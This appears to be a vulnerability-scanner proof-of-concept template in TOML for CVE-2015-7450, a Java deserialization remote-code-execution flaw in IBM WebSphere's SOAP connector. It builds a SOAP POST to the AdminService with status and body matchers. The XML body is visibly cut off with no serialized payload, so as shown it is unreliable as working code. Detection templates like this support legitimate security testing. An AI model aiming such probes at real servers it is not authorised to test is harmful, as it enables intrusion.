[info]
author = "ave"
description = "IBM WebSphere SOAP Connector 端口 8880 存在 Java 反序列化漏洞，攻击者可通过发送特制的 SOAP 请求触发 InvokerTransformer 反序列化，实现远程代码执行"
id = "POC-AVE-2015-0668"
name = "CVE-2015-7450 PoC"
severity = "critical"
tags = ["ave-2015-0668"]
vuln_id = [
    "CVE-2015-7450",
    "AVE-2015-0668",
]

[poc]
logic = "all"

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}"
protocol = "http"

[poc.requests.body]
content = """
<?xml version='1.0' encoding='UTF-8'?>
<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
<SOAP-ENV:Header ns0:JMXConnectorContext=""""
type = "raw"

[poc.requests.headers]
Content-Type = "text/xml; charset=utf-8"
SOAPAction = "urn:AdminService"

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"

[[poc.requests.matchers]]
expect = false
part = "body"
type = "word"
words = ["javax.management"]
